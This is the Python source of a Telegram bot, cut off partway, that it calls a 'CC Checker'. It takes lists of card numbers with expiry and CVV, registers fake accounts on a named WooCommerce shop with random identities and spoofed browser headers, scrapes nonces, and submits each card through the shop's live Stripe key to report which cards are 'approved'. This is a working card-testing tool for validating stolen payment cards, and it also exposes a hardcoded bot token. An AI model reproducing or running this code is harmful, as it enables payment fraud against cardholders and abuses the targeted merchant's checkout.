import requests
import asyncio
import json
import random
import re
import os
import aiohttp
from fake_useragent import UserAgent
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import logging
from datetime import datetime

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════
BOT_TOKEN = "8688444889:AAFgh0wrGC9o0oSg3wlECoTbh2krXkz0i68"

# Admin IDs (Telegram user IDs of bot admins)
ADMIN_IDS = [8899843332]  # Replace with actual admin Telegram IDs

# Force Join Channels (can be managed via admin panel)
FORCE_CHANNELS = [
    # Format: {"id": "@channelusername", "url": "https://t.me/channelusername", "name": "Channel Name"}
    # Example: {"id": "@x64kbitters", "url": "https://t.me/x64kbitters", "name": "x64kbitters Official"}
]

# Statistics
stats = {
    'total': 0,
    'approved': 0,
    'declined': 0,
    'unknown': 0,
    'errors': 0,
    'start_time': datetime.now(),
    'total_users': set(),
    'active_users': set()
}

# Global variables for processing
processing_cards = []
processing_status = {}
current_message_id = None
current_chat_id = None

# Admin panel states
admin_states = {}  # user_id -> state

# ═══════════════════════════════════════════════════════════════
# PREMIUM CUSTOM EMOJI IDs
# ═══════════════════════════════════════════════════════════════
EMOJIS = {
    'sparkles': '6170163662544707658',
    'search': '6294142703907116473',
    'credit_card': '6294106669131503002',
    'chart': '6176905893616031802',
    'file_folder': '6091456153462512920',
    'reset': '6176742294016760397',
    'help': '6293797538860373333',
    'check': '5318938025361679130',
    'cross': '5316657943188349246',
    'warning': '5316971840873177080',
    'rocket': '6129812419028982717',
    'fire': '6129705083501293112',
    'star': '6129801569941592173',
    'zap': '6129650399977675538',
    'clock': '6129769198773083022',
    'lock': '6131886699254388574',
    'globe': '6129572317472233948',
    'shield': '6129817830687775854',
    'gear': '6129653943325694007',
    'target': '6129488844782836766',
    'trophy': '6129891098534877664',
    'crown': '6129625171339778354',
    'diamond': '6129782839589214594',
    'money': '6129771638314523716',
    'gift': '6129444065453808638',
    'party': '6129828611055689014',
    'bot': '5219899949281453881',
    'enter': '5222472119295684375',
    'upload': '5222108309795908493',
    'back': '5219672809936006424',
    'cancel': '5244820603663296299',
    'refresh': '5219943216781995020',
    'menu': '5222400230133081714',
    'pin': '5222148368955877900',
    'bulb': '5246794802560774143',
    'key': '5220053623211305785',
    'bell': '5220197908342648622',
    'bookmark': '5222241728659988366',
    'magic': '5260424249914435335',
    'crystal': '5219901967916084166',
    'compass': '5217890643321300022',
    'hourglass': '5246863809800318186',
    'speed': '5247213725080890199',
    'brain': '5258023599419171861',
    'eye': '5220070652756635426',
    'link': '5246942081284320100',
    'hash': '5220046725493828505',
    'code': '5303396278179210513',
    'database': '5276489300207217985',
    'satellite': '5294524383279198295',
    'radar': '5294096239464295059',
    'atom': '5364174510708764528',
    'microscope': '5294527084813626369',
    'dna': '5294017134756636818',
    'admin': '5318938025361679130',
    'broadcast': '6129812419028982717',
    'user': '6129705083501293112',
    'channel': '6129801569941592173',
    'add': '6129650399977675538',
    'remove': '5316657943188349246',
    'list': '6129769198773083022',
    'forward': '6131886699254388574',
    'send': '6129572317472233948',
    'stats2': '6129817830687775854',
    'settings': '6129653943325694007',
    'ban': '6129488844782836766',
    'unban': '6129891098534877664',
    'info': '6129625171339778354',
    'verified': '6129782839589214594',
    'join': '6129771638314523716',
    'leave': '6129444065453808638',
    'notification': '6129828611055689014',
    'megaphone': '5219899949281453881',
    'announcement': '5222472119295684375',
    'group': '5222108309795908493',
    'private': '5219672809936006424',
    'public': '5244820603663296299',
    'lock2': '5219943216781995020',
    'unlock': '5222400230133081714',
    'power': '5222148368955877900',
    'restart': '5246794802560774143',
    'stop': '5220053623211305785',
    'play': '5220197908342648622',
    'pause': '5222241728659988366',
    'skip': '5260424249914435335',
    'reply': '5219901967916084166',
    'edit': '5217890643321300022',
    'delete': '5246863809800318186',
    'copy': '5247213725080890199',
    'paste': '5258023599419171861',
    'cut': '5220070652756635426',
    'save': '5246942081284320100',
    'load': '5220046725493828505',
    'download': '5303396278179210513',
    'upload2': '5276489300207217985',
    'cloud': '5294524383279198295',
    'server': '5294096239464295059',
    'network': '5364174510708764528',
    'wifi': '5294527084813626369',
    'bluetooth': '5294017134756636818',
}

def e(key):
    """Return custom emoji HTML tag for Telegram Premium"""
    emoji_id = EMOJIS.get(key, '')
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">⭐</tg-emoji>'
    return '⭐'

# ═══════════════════════════════════════════════════════════════
# BUTTON HELPER
# ═══════════════════════════════════════════════════════════════
def btn(text, callback_data=None, url=None, style=None, emoji_key=None):
    """Create styled InlineKeyboardButton with custom emoji"""
    kwargs = {}

    if url:
        kwargs['url'] = url
    elif callback_data:
        kwargs['callback_data'] = callback_data

    if emoji_key and emoji_key in EMOJIS:
        kwargs['icon_custom_emoji_id'] = EMOJIS[emoji_key]

    if style:
        kwargs['style'] = style

    return InlineKeyboardButton(text, **kwargs)

# ═══════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════
def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def is_admin(user_id):
    """Check if user is admin"""
    return user_id in ADMIN_IDS

async def get_random_info():
    return {"email": f"user{random.randint(100000, 999999)}@gmail.com"}

async def check_membership(user_id, channel_id, context):
    """Check if user is member of a channel"""
    try:
        member = await context.bot.get_chat_member(channel_id, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

async def get_force_join_markup(context):
    """Generate force join buttons for all required channels"""
    if not FORCE_CHANNELS:
        return None

    keyboard = []
    for ch in FORCE_CHANNELS:
        keyboard.append([
            btn(f"{e('channel')} {ch['name']}", url=ch['url'], style='primary', emoji_key='channel')
        ])

    keyboard.append([
        btn(f"{e('verified')} I have Joined", "verify_join", style='success', emoji_key='verified')
    ])

    return InlineKeyboardMarkup(keyboard)

async def check_force_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if user has joined all required channels"""
    user_id = update.effective_user.id

    if not FORCE_CHANNELS:
        return True

    not_joined = []
    for ch in FORCE_CHANNELS:
        if not await check_membership(user_id, ch['id'], context):
            not_joined.append(ch)

    if not_joined:
        text = (
            f"{e('lock')} <b>Access Required!</b> {e('lock')}\n\n"
            f"{e('warning')} You must join the following channel(s) to use this bot:\n\n"
            f"{e('channel')} <b>Please join and click verify:</b>"
        )

        if update.callback_query:
            await update.callback_query.edit_message_text(
                text,
                parse_mode='HTML',
                reply_markup=await get_force_join_markup(context)
            )
        else:
            await update.message.reply_text(
                text,
                parse_mode='HTML',
                reply_markup=await get_force_join_markup(context)
            )
        return False

    return True

# ═══════════════════════════════════════════════════════════════
# CC CHECKER CORE
# ═══════════════════════════════════════════════════════════════
async def check_cc(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano

        random_data = await get_random_info()
        email = random_data["email"]
        user = f"user{random.randint(100000, 999999)}"

        s = requests.Session()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/', headers=headers)

        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')

        if not nonce:
            return f"{e('cross')} DECLINED - Failed to get nonce"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'username': user,
            'email': email,
            'mailpoet[subscribe_on_register_active]': '1',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://radio-tecs.com/',
            'wc_order_attribution_session_start_time': '2025-08-29 09:50:42',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }

        response = s.post('https://radio-tecs.com/my-account-2/', headers=headers, data=data)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/payment-methods/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image.webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u-0, i',
            'referer': 'https://radio-tecs.com/my-account-2/payment-methods/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/add-payment-method/', headers=headers)

        pnonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')

        if not pnonce:
            return f"{e('cross')} DECLINED - Failed to get payment nonce"

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/e837b000d9; stripe-js-v3/e837b000d9; payment-element; deferred-intent',
            'referrer': 'https://radio-tecs.com',
            'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
            '_stripe_version': '2024-06-20',
        }

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        if response.status_code != 200:
            return f"{e('cross')} DECLINED - Stripe Error: {response.status_code}"

        try:
            payment_id = response.json()['id']
        except:
            return f"{e('cross')} DECLINED - Failed to get payment ID"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=1, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'is_woopay_preflight_check': '0',
            'payment_method': payment_id,
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': pnonce,
        }

        response = s.post('https://radio-tecs.com/wp-admin/admin-ajax.php', headers=headers, data=data)

        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    return f"{e('check')} APPROVED {e('check')}"
                else:
                    error_data = result.get('data', {})
                    if isinstance(error_data, dict) and 'error' in error_data:
                        error_msg = error_data['error'].get('message', 'Unknown error')
                    else:
                        error_msg = result.get('data', {}).get('message', 'Unknown error')
                    return f"{e('cross')} DECLINED {e('cross')} - {error_msg}"
            except json.JSONDecodeError:
                if response.text.strip() == '0':
                    return f"{e('cross')} DECLINED {e('cross')} - Nonce failed"
                elif 'error' in response.text.lower():
                    return f"{e('cross')} DECLINED {e('cross')} - {response.text}"
                else:
                    return f"{e('warning')} UNKNOWN {e('warning')} - {response.text}"
        else:
            return f"{e('warning')} HTTP Error: {response.status_code}"

    except Exception as e:
        return f"{e('warning')} ERROR {e('warning')} - {str(e)}"


# ═══════════════════════════════════════════════════════════════
# USER HANDLERS
# ═══════════════════════════════════════════════════════════════
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with force join check"""
    user = update.effective_user
    stats['total_users'].add(user.id)
    stats['active_users'].add(user.id)

    # Check force join first
    if not await check_force_join(update, context):
        return

    keyboard = [
        [
            btn(f"{e('credit_card')} Check CC", "check_cc", style='primary', emoji_key='credit_card'),
            btn(f"{e('chart')} Stats", "stats", style='primary', emoji_key='chart')
        ],
        [
            btn(f"{e('file_folder')} Check File", "check_file", style='primary', emoji_key='file_folder'),
            btn(f"{e('reset')} Reset Stats", "reset_stats", style='danger', emoji_key='reset')
        ],
        [
            btn(f"{e('help')} Help", "help", style='primary', emoji_key='help')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    welcome_text = (
        f"{e('sparkles')} <b>Welcome to CC Checker Bot!</b> {e('sparkles')}

"
        f"{e('search')} <b>I can help you validate credit cards</b>
"
        f"{e('pin')} <b>Send me cards in this format:</b>
"
        f"<code>5121078835045021|12|2041|111</code>

"
        f"{e('file_folder')} <b>Or send a .txt file with multiple cards</b>
"
        f"{e('zap')} <b>Use /chk to start checking</b>

"
        f"{e('gear')} <b>Choose an option below:</b>"
    )

    await update.message.reply_text(
        welcome_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Verify user has joined all channels"""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    not_joined = []

    for ch in FORCE_CHANNELS:
        if not await check_membership(user_id, ch['id'], context):
            not_joined.append(ch['name'])

    if not_joined:
        await query.answer(
            f"❌ You haven't joined: {', '.join(not_joined)}",
            show_alert=True
        )
        return

    await query.edit_message_text(
        f"{e('check')} <b>Verification Successful!</b> {e('check')}

"
        f"{e('zap')} You can now use the bot.",
        parse_mode='HTML'
    )

    # Show main menu after verification
    await asyncio.sleep(1)
    await start(update, context)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()

    # Check force join for non-verify buttons
    if query.data != "verify_join":
        if not await check_force_join(update, context):
            return

    if query.data == "check_cc":
        await query.edit_message_text(
            f"{e('credit_card')} <b>Please send me the CC details</b>

"
            f"Format: <code>5121078835045021|12|2041|111</code>
"
            f"You can send multiple cards, one per line.

"
            f"<i>Send /cancel to stop</i>",
            parse_mode='HTML'
        )
        context.user_data['waiting_for_cc'] = True

    elif query.data == "check_file":
        await query.edit_message_text(
            f"{e('file_folder')} <b>Please send me a .txt file</b>
"
            f"The file should contain one card per line.

"
            f"Format: <code>5121078835045021|12|2041|111</code>

"
            f"<i>Send /cancel to stop</i>",
            parse_mode='HTML'
        )
        context.user_data['waiting_for_file'] = True

    elif query.data == "stats":
        await show_stats(update, context)

    elif query.data == "reset_stats":
        await reset_stats(update, context)

    elif query.data == "help":
        await show_help(update, context)

    elif query.data == "back_to_menu":
        await back_to_menu(update, context)

    elif query.data == "verify_join":
        await verify_join(update, context)

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics with premium styling"""
    uptime = datetime.now() - stats['start_time']
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60

    success_rate = f"{stats['approved']/stats['total']*100:.1f}%" if stats['total'] > 0 else "0%"

    stats_text = (
        f"{e('chart')} <b>━━━━━━ STATISTICS ━━━━━━</b> {e('chart')}

"
        f"{e('clock')} <b>Uptime:</b> <code>{hours}h {minutes}m</code>
"
        f"{e('target')} <b>Total Checked:</b> <code>{stats['total']}</code>
"
        f"{e('user')} <b>Total Users:</b> <code>{len(stats['total_users'])}</code>

"
        f"{e('check')} <b>Approved:</b> <code>{stats['approved']}</code>
"
        f"{e('cross')} <b>Declined:</b> <code>{stats['declined']}</code>
"
        f"{e('warning')} <b>Unknown:</b> <code>{stats['unknown']}</code>
"
        f"{e('cancel')} <b>Errors:</b> <code>{stats['errors']}</code>

"
        f"{e('trophy')} <b>Success Rate:</b> <code>{success_rate}</code>"
    )

    keyboard = [[btn(f"{e('refresh')} Refresh Stats", "stats", style='primary', emoji_key='refresh')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.edit_message_text(
            stats_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            stats_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def reset_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reset statistics"""
    global stats
    stats = {
        'total': 0,
        'approved': 0,
        'declined': 0,
        'unknown': 0,
        'errors': 0,
        'start_time': datetime.now(),
        'total_users': stats['total_users'],
        'active_users': stats['active_users']
    }

    keyboard = [[btn(f"{e('back')} Back to Menu", "back_to_menu", style='primary', emoji_key='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.callback_query.edit_message_text(
        f"{e('reset')} <b>Statistics have been reset!</b> {e('check')}

"
        f"All counters are now at 0.",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message with premium emojis"""
    help_text = (
        f"{e('help')} <b>━━━━━━ HELP ━━━━━━</b> {e('help')}

"
        f"{e('bot')} <b>Bot Commands:</b>
"
        f"• <code>/start</code> - Welcome message {e('sparkles')}
"
        f"• <code>/chk</code> - Start checking CCs {e('search')}
"
        f"• <code>/stats</code> - Show statistics {e('chart')}
"
        f"• <code>/reset</code> - Reset statistics {e('reset')}

"
        f"{e('credit_card')} <b>CC Format:</b>
"
        f"<code>5121078835045021|12|2041|111</code>
"
        f"<i>(card|month|year|cvv)</i>

"
        f"{e('file_folder')} <b>File Support:</b>
"
        f"Send a .txt file with cards
"
        f"One card per line

"
        f"{e('bulb')} <b>Tips:</b>
"
        f"• Use inline buttons for quick actions {e('zap')}
"
        f"• Check stats to track your progress {e('chart')}
"
        f"• Send /cancel to stop any operation {e('cancel')}"
    )

    keyboard = [[btn(f"{e('back')} Back to Menu", "back_to_menu", style='primary', emoji_key='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.edit_message_text(
            help_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            help_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Return to main menu"""
    query = update.callback_query
    await query.answer()

    keyboard = [
        [
            btn(f"{e('credit_card')} Check CC", "check_cc", style='primary', emoji_key='credit_card'),
            btn(f"{e('chart')} Stats", "stats", style='primary', emoji_key='chart')
        ],
        [
            btn(f"{e('file_folder')} Check File", "check_file", style='primary', emoji_key='file_folder'),
            btn(f"{e('reset')} Reset Stats", "reset_stats", style='danger', emoji_key='reset')
        ],
        [
            btn(f"{e('help')} Help", "help", style='primary', emoji_key='help')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        f"{e('sparkles')} <b>Welcome to CC Checker Bot!</b> {e('sparkles')}

"
        f"{e('search')} <b>I can help you validate credit cards</b>
"
        f"{e('pin')} <b>Send me cards in this format:</b>
"
        f"<code>5121078835045021|12|2041|111</code>

"
        f"{e('file_folder')} <b>Or send a .txt file with multiple cards</b>
"
        f"{e('zap')} <b>Use /chk to start checking</b>

"
        f"{e('gear')} <b>Choose an option below:</b>",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages and files"""
    global processing_cards, processing_status, current_message_id, current_chat_id

    # Check admin states first
    user_id = update.effective_user.id
    if user_id in admin_states:
        await handle_admin_state(update, context)
        return

    # Check force join
    if not await check_force_join(update, context):
        return

    # Check for cancel command
    if update.message.text and update.message.text.lower() == '/cancel':
        context.user_data.clear()
        await update.message.reply_text(
            f"{e('cancel')} <b>Operation cancelled!</b>
"
            f"Use /start to begin again.",
            parse_mode='HTML'
        )
        return

    # Handle CC input
    if context.user_data.get('waiting_for_cc'):
        text = update.message.text.strip()
        lines = text.split('
')
        valid_cards = []

        for line in lines:
            if line.strip():
                if '|' in line and len(line.split('|')) == 4:
                    valid_cards.append(line.strip())
                else:
                    await update.message.reply_text(
                        f"{e('cross')} <b>Invalid format:</b> <code>{line}</code>
"
                        f"Please use: <code>5121078835045021|12|2041|111</code>",
                        parse_mode='HTML'
                    )
                    return

        if valid_cards:
            context.user_data['waiting_for_cc'] = False
            await process_cards(update, context, valid_cards)
        else:
            await update.message.reply_text(
                f"{e('cross')} <b>No valid cards found!</b>
"
                f"Please send cards in the correct format.",
                parse_mode='HTML'
            )
        return

    # Handle file upload
    if context.user_data.get('waiting_for_file'):
        if update.message.document:
            file = await update.message.document.get_file()
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            lines = text.split('
')
            valid_cards = []

            for line in lines:
                if line.strip():
                    if '|' in line and len(line.split('|')) == 4:
                        valid_cards.append(line.strip())

            if valid_cards:
                context.user_data['waiting_for_file'] = False
                await process_cards(update, context, valid_cards)
            else:
                await update.message.reply_text(
                    f"{e('cross')} <b>No valid cards found in file!</b>
"
                    f"Each line should be in format: <code>5121078835045021|12|2041|111</code>",
                    parse_mode='HTML'
                )
        else:
            await update.message.reply_text(
                f"{e('cross')} <b>Please send a text file!</b>
"
                f"Use /cancel to stop.",
                parse_mode='HTML'
            )
        return

    # Handle /chk command
    if update.message.text and update.message.text.startswith('/chk'):
        await start_check(update, context)
        return

    # Handle unknown messages
    if update.message.text and not update.message.text.startswith('/'):
        await update.message.reply_text(
            f"{e('help')} <b>Unknown command or format</b>

"
            f"Use /start to see available options
"
            f"Or send cards in format:
"
            f"<code>5121078835045021|12|2041|111</code>",
            parse_mode='HTML'
        )

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start checking process"""
    keyboard = [
        [
            btn(f"{e('enter')} Enter Cards", "check_cc", style='success', emoji_key='enter'),
            btn(f"{e('upload')} Upload File", "check_file", style='success', emoji_key='upload')
        ],
        [
            btn(f"{e('back')} Back", "back_to_menu", style='primary', emoji_key='back')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"{e('search')} <b>Start CC Checking</b>

"
        f"Choose how you want to provide the cards:

"
        f"{e('enter')} <b>Option 1:</b> Enter cards manually
"
        f"{e('upload')} <b>Option 2:</b> Upload a .txt file

"
        f"<i>Each card should be in format:</i>
"
        f"<code>5121078835045021|12|2041|111</code>",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def process_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, cards):
    """Process multiple cards with premium progress bar"""
    global processing_cards, processing_status, current_message_id, current_chat_id

    processing_cards = cards
    processing_status = {}
    current_chat_id = update.effective_chat.id

    progress_text = (
        f"{e('rocket')} <b>Processing Cards</b> {e('rocket')}

"
        f"▱▱▱▱▱▱▱▱▱▱ 0%

"
        f"{e('target')} <b>Total:</b> <code>{len(cards)}</code>
"
        f"{e('check')} <b>Approved:</b> <code>0</code>
"
        f"{e('cross')} <b>Declined:</b> <code>0</code>
"
        f"{e('warning')} <b>Unknown:</b> <code>0</code>
"
        f"{e('cancel')} <b>Errors:</b> <code>0</code>

"
        f"{e('hourglass')} <b>Processing...</b>"
    )

    msg = await update.message.reply_text(
        progress_text,
        parse_mode='HTML'
    )
    current_message_id = msg.message_id

    async with aiohttp.ClientSession() as session:
        for i, card in enumerate(cards, 1):
            result = await check_cc(card, session)
            processing_status[card] = result

            stats['total'] += 1
            if 'APPROVED' in result:
                stats['approved'] += 1
            elif 'DECLINED' in result:
                stats['declined'] += 1
            elif 'ERROR' in result or 'HTTP' in result:
                stats['errors'] += 1
            else:
                stats['unknown'] += 1

            progress = int((i / len(cards)) * 10)
            bar = "▰" * progress + "▱" * (10 - progress)
            percentage = int((i / len(cards)) * 100)

            progress_text = (
                f"{e('rocket')} <b>Processing Cards</b> {e('rocket')}

"
                f"{bar} {percentage}%

"
                f"{e('target')} <b>Total:</b> <code>{len(cards)}</code>
"
                f"{e('check')} <b>Approved:</b> <code>{stats['approved']}</code>
"
                f"{e('cross')} <b>Declined:</b> <code>{stats['declined']}</code>
"
                f"{e('warning')} <b>Unknown:</b> <code>{stats['unknown']}</code>
"
                f"{e('cancel')} <b>Errors:</b> <code>{stats['errors']}</code>

"
                f"{e('hourglass')} <b>Processing...</b> <code>{i}/{len(cards)}</code>"
            )

            try:
                await context.bot.edit_message_text(
                    progress_text,
                    chat_id=current_chat_id,
                    message_id=current_message_id,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error updating progress: {e}")

            await asyncio.sleep(0.1)

    await show_results(update, context)

async def show_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show final results with premium styled inline buttons"""
    global processing_cards, processing_status, current_message_id, current_chat_id

    approved = []
    declined = []
    unknown = []
    errors = []

    for card, result in processing_status.items():
        if 'APPROVED' in result:
            approved.append((card, result))
        elif 'DECLINED' in result:
            declined.append((card, result))
        elif 'ERROR' in result or 'HTTP' in result:
            errors.append((card, result))
        else:
            unknown.append((card, result))

    results_text = (
        f"{e('trophy')} <b>━━━━━━ RESULTS ━━━━━━</b> {e('trophy')}

"
        f"{e('target')} <b>Total:</b> <code>{len(processing_cards)}</code>
"
        f"{e('check')} <b>Approved:</b> <code>{len(approved)}</code>
"
        f"{e('cross')} <b>Declined:</b> <code>{len(declined)}</code>
"
        f"{e('warning')} <b>Unknown:</b> <code>{len(unknown)}</code>
"
